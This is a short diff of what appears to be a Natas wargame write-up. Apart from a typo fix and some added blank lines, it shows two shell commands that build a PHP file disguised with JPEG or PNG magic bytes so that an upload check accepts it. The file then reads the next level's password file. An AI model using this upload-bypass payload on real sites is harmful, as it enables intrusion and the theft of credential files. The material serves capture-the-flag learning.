@@ -37,11 +37,17 @@ we can bypass this function by crafting a php file beginning with an image file 
 echo "\xff\xd8\xff\xe8 <? include '/etc/natas_webpass/natas14'; ?>" > exp.php
 ```
 
-2. using PNG magicn number
+2. using PNG magic number
 
 ```bash
 echo "\x89\x50\x4E\x47\x0D\x0A\x1A\x0A <? include '/etc/natas_webpass/natas14'; ?>" > exp.php
 ```
+
+
+
+
+
+
 
 
 
